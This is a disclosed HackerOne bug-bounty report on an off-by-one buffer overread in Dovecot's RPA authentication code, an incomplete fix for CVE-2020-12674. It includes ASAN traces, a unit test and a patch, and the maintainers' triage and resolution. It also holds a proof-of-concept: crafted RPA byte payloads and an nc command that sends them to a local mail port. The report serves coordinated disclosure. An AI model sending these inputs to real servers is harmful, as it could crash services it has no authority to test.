{"id":967457,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85Njc0NTc=","url":"https://hackerone.com/reports/967457","title":"Buffer overread off by one in `rpa_read_buffer`, incomplete fix for CVE-2020-12674","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-08-26T07:17:35.897Z","submitted_at":"2020-08-26T07:17:35.966Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"catenacyber","url":"/catenacyber","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-12674"],"singular_disclosure_disabled":true,"disclosed_at":"2021-01-04T20:56:52.371Z","bug_reporter_agreed_on_going_public_at":"2021-01-04T20:56:52.321Z","team_member_agreed_on_going_public_at":"2021-01-04T18:31:42.525Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"In function `rpa_read_buffer`, the condition in\n```\n\tif (p \u003e end)\n\t\treturn 0;\n\n\tlen = *p++;\n```\nis not strict enough\n\nIt should be \n```\n\tif (p \u003e= end)\n\t\treturn 0;\n\n\tlen = *p++;\n```\n\nThe fix from https://github.com/dovecot/core/commit/69ad3c902ea4bbf9f21ab1857d8923f975dc6145 is not enough\n\nThe ASAN stack trace is\n```\n=================================================================\n==27414==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6040000006be at pc 0x00010fd2dd33 bp 0x7ffedff66f00 sp 0x7ffedff66ef8\nREAD of size 1 at 0x6040000006be thread T0\n    #0 0x10fd2dd32 in rpa_read_buffer mech-rpa.c:226\n    #1 0x10fd2d757 in rpa_parse_token3 mech-rpa.c:283\n    #2 0x10fd2c44b in mech_rpa_auth_phase2 mech-rpa.c:504\n    #3 0x10fc99d79 in LLVMFuzzerTestOneInput fuzz-auth-server.c:169\n```\n\nSteps to reproduce should be\n\n```\n(echo 'AUTH RPA'; echo -ne\n'`\\x11\\x06\\x09`\\x86H\\x01\\x86\\xf8s\\x01\\x01\\x01\\x00\\x04\\x00\\x00\\x01';\necho -ne '`\\x11\\x06\\x09`\\x86H\\x01\\x86\\xf8s\\x01\\x01\\x00\\x04A@A\\x00')  | nc 127.0.0.1 110\n```\n\n## Impact\n\nThis overread could cause a crash, but as an off by one, it is difficult","bounty_amount":"400.0","formatted_bounty":"$400","weakness":{"id":9,"name":"Buffer Over-read"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":2,"voters":["secator","khan_78"],"severity":{"rating":"medium","score":5.4,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"low"}},"structured_scope":{"databaseId":42899,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/dovecot/core","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9050977,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi! Thank you for reporting this, we are looking into it.","automated_response":false,"created_at":"2020-08-27T05:34:08.159Z","updated_at":"2020-08-27T05:34:08.159Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9051119,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"The steps to reproduce are looking wrong, because SASL should use base64. I attempted to correctly encode that command, but was unable to actually reproduce this issue with latest master.","automated_response":false,"created_at":"2020-08-27T05:57:09.946Z","updated_at":"2020-08-27T05:57:09.946Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9053314,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"\u003e The steps to reproduce are looking wrong\n\nIndeed.\nIn facts, I was inspired by `test_rpa`\n\nSo, here is `test_rpa2` which triggers the bug\n```\nstatic void test_rpa2(void)\n{\n\tstatic struct auth_request_handler handler = {\n\t\t.callback = auth_client_request_mock_callback,\n\t\t.reply_callback = request_handler_reply_mock_callback,\n\t\t.reply_continue_callback = request_handler_reply_continue_mock_callback,\n\t\t.verify_plain_continue_callback = verify_plain_continue_mock_callback,\n\t};\n\n\tconst struct mech_module *mech = \u0026mech_rpa;\n\ttest_begin(\"test rpa\");\n\tstruct auth_request *req = mech-\u003eauth_new();\n\tglobal_auth_settings-\u003erealms_arr = t_strsplit(\"example.com\", \" \");\n\treq-\u003eset = global_auth_settings;\n\treq-\u003eservice = \"login\";\n\treq-\u003ehandler = \u0026handler;\n\treq-\u003emech_event = event_create(NULL);\n\treq-\u003eevent = event_create(NULL);\n\treq-\u003emech = mech;\n\treq-\u003estate = AUTH_REQUEST_STATE_MECH_CONTINUE;\n\tauth_request_state_count[AUTH_REQUEST_STATE_MECH_CONTINUE] = 1;\n\tmech-\u003eauth_initial(req, UCHAR_LEN(\"\\x60\\x11\\x06\\x09\\x60\\x86\\x48\\x01\\x86\\xf8\\x73\\x01\\x01\\x01\\x00\\x04\\x00\\x00\\x01\"));\n\tconst unsigned char * payload = \"\\x60\\x11\\x06\\x09\\x60\\x86\\x48\\x01\\x86\\xf8\\x73\\x01\\x01\\x00\\x04\\x41\\x40\\x41\";\n\t//includes the final null character\n\tmech-\u003eauth_continue(req, payload, sizeof(payload));\n\ttest_assert(req-\u003efailed == TRUE);\n\ttest_assert(req-\u003epassdb_success == FALSE);\n\tevent_unref(\u0026req-\u003emech_event);\n\tevent_unref(\u0026req-\u003eevent);\n\tmech-\u003eauth_free(req);\n\ttest_end();\n}\n```\n\nYou can put it in test-mech.c to get \n```\n==1251==ERROR: AddressSanitizer: global-buffer-overflow on address 0x000105a56473 at pc 0x0001059fbc63 bp 0x7ffeea261460 sp 0x7ffeea261458\nREAD of size 1 at 0x000105a56473 thread T0\n    #0 0x1059fbc62 in rpa_read_buffer mech-rpa.c:226\n    #1 0x1059fb687 in rpa_parse_token3 mech-rpa.c:283\n    #2 0x1059fa37b in mech_rpa_auth_phase2 mech-rpa.c:504\n    #3 0x1059a0ccb in test_rpa2 test-mech.c:489\n    #4 0x105d5e5b3 in test_run_funcs test-common.c:285\n    #5 0x105d5e3fb in test_run test-common.c:356\n    #6 0x7fff60f0f014 in start (libdyld.dylib:x86_64+0x1014)\n```\n\nBy the way, `test_rpa` does not seem to test the right behavior because of string escaping which is not the same as in bash\nHere is a patch :\n```\ndiff --git a/src/auth/test-mech.c b/src/auth/test-mech.c\nindex 0a22ff46d0..30470a75c6 100644\n--- a/src/auth/test-mech.c\n+++ b/src/auth/test-mech.c\n@@ -423,7 +423,7 @@ static void test_rpa(void)\n        req-\u003estate = AUTH_REQUEST_STATE_MECH_CONTINUE;\n        auth_request_state_count[AUTH_REQUEST_STATE_MECH_CONTINUE] = 1;\n        mech-\u003eauth_initial(req, UCHAR_LEN(\"\\x60\\x11\\x06\\x09\\x60\\x86\\x48\\x01\\x86\\xf8\\x73\\x01\\x01\\x01\\x00\\x04\\x00\\x00\\x01\"));\n-       mech-\u003eauth_continue(req, UCHAR_LEN(\"\\x60\\x11\\x06\\x09\\x60\\x86\\x48\\x01\\x86\\xf8\\x73\\x01\\x01\\x00\\x03A@A\\x00\"));\n+       mech-\u003eauth_continue(req, UCHAR_LEN(\"\\x60\\x11\\x06\\x09\\x60\\x86\\x48\\x01\\x86\\xf8\\x73\\x01\\x01\\x00\\x03\\x41\\x40\\x41\\x00\"));\n        test_assert(req-\u003efailed == TRUE);\n        test_assert(req-\u003epassdb_success == FALSE);\n        event_unref(\u0026req-\u003emech_event);\n@@ -463,11 +463,45 @@ static void test_ntlm(void)\n```","automated_response":false,"created_at":"2020-08-27T11:07:00.426Z","updated_at":"2020-08-27T11:07:00.426Z","actor":{"username":"catenacyber","cleared":false,"url":"/catenacyber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9063828,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hum. I am not able to reproduce this even with your patch against current master. I used valgrind instead of asan here, but that should not really make a difference?\n\n```\nauth mech SCRAM-SHA-256 84/84 ........................................ : ok\nInfo: invalid token 3: invalid user challenge\ntest rpa ............................................................. : ok\nInfo: invalid token 3: structure length disagrees with data size\ntest rpa ............................................................. : ok\nInfo: invalid NTLM response: buffer length out of bounds\ntest ntlm ............................................................ : ok\n```","automated_response":false,"created_at":"2020-08-28T09:23:41.752Z","updated_at":"2020-08-28T09:23:57.296Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9064192,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Indeed, `sizeof(payload)` seems wrong, not sure how it worked the first time...\nSo I replaced it with\n```\n\tconst unsigned char payload[19] = \"\\x60\\x11\\x06\\x09\\x60\\x86\\x48\\x01\\x86\\xf8\\x73\\x01\\x01\\x00\\x04\\x41\\x40\\x41\";\n\t//includes the final null character\n\tmech-\u003eauth_continue(req, payload, 19);\n```\n\nHere its the full test_rpa2\n```\nstatic void test_rpa2(void)\n{\n\tstatic struct auth_request_handler handler = {\n\t\t.callback = auth_client_request_mock_callback,\n\t\t.reply_callback = request_handler_reply_mock_callback,\n\t\t.reply_continue_callback = request_handler_reply_continue_mock_callback,\n\t\t.verify_plain_continue_callback = verify_plain_continue_mock_callback,\n\t};\n\n\tconst struct mech_module *mech = \u0026mech_rpa;\n\ttest_begin(\"test rpa2\");\n\tstruct auth_request *req = mech-\u003eauth_new();\n\tglobal_auth_settings-\u003erealms_arr = t_strsplit(\"example.com\", \" \");\n\treq-\u003eset = global_auth_settings;\n\treq-\u003eservice = \"login\";\n\treq-\u003ehandler = \u0026handler;\n\treq-\u003emech_event = event_create(NULL);\n\treq-\u003eevent = event_create(NULL);\n\treq-\u003emech = mech;\n\treq-\u003estate = AUTH_REQUEST_STATE_MECH_CONTINUE;\n\tauth_request_state_count[AUTH_REQUEST_STATE_MECH_CONTINUE] = 1;\n\tmech-\u003eauth_initial(req, UCHAR_LEN(\"\\x60\\x11\\x06\\x09\\x60\\x86\\x48\\x01\\x86\\xf8\\x73\\x01\\x01\\x01\\x00\\x04\\x00\\x00\\x01\"));\n\tconst unsigned char payload[19] = \"\\x60\\x11\\x06\\x09\\x60\\x86\\x48\\x01\\x86\\xf8\\x73\\x01\\x01\\x00\\x04\\x41\\x40\\x41\";\n\t//includes the final null character\n\tmech-\u003eauth_continue(req, payload, 19);\n\ttest_assert(req-\u003efailed == TRUE);\n\ttest_assert(req-\u003epassdb_success == FALSE);\n\tevent_unref(\u0026req-\u003emech_event);\n\tevent_unref(\u0026req-\u003eevent);\n\tmech-\u003eauth_free(req);\n\ttest_end();\n}\n```\n\nAnd I get \n```\n=================================================================\n==98755==ERROR: AddressSanitizer: global-buffer-overflow on address 0x00010e8cca53 at pc 0x00010e872133 bp 0x7ffee13eb460 sp 0x7ffee13eb458\nREAD of size 1 at 0x00010e8cca53 thread T0\n    #0 0x10e872132 in rpa_read_buffer mech-rpa.c:228\n    #1 0x10e871b37 in rpa_parse_token3 mech-rpa.c:285\n    #2 0x10e87081b in mech_rpa_auth_phase2 mech-rpa.c:506\n    #3 0x10e816d3b in test_rpa2 test-mech.c:490\n    #4 0x10ebd75b3 in test_run_funcs test-common.c:285\n    #5 0x10ebd73fb in test_run test-common.c:356\n    #6 0x7fff60f0f014 in start (libdyld.dylib:x86_64+0x1014)\n```","automated_response":false,"created_at":"2020-08-28T10:18:29.825Z","updated_at":"2020-08-28T10:18:29.825Z","actor":{"username":"catenacyber","cleared":false,"url":"/catenacyber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9085938,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Ok - was able to reproduce this now.","automated_response":false,"created_at":"2020-08-31T10:28:42.511Z","updated_at":"2020-08-31T10:28:42.511Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9274888,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for reporting this issue.","automated_response":false,"created_at":"2020-09-21T09:19:48.498Z","updated_at":"2020-09-21T09:19:48.498Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"catenacyber","url":"/catenacyber"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9790913,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We decided to remove RPA support completely. We will disclose this vulnerability on next CE release. Due to christmas it is possible that we need to postpone the disclosure to early January.","automated_response":false,"created_at":"2020-11-11T12:13:02.873Z","updated_at":"2020-11-11T12:13:02.873Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"catenacyber","url":"/catenacyber"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10266422,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-04T18:31:42.590Z","updated_at":"2021-01-04T18:31:42.590Z","first_to_agree":true,"actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10268094,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-04T20:56:52.342Z","updated_at":"2021-01-04T20:56:52.342Z","actor":{"username":"catenacyber","cleared":false,"url":"/catenacyber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10268095,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-01-04T20:56:52.400Z","updated_at":"2021-01-04T20:56:52.400Z","actor":{"username":"catenacyber","cleared":false,"url":"/catenacyber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}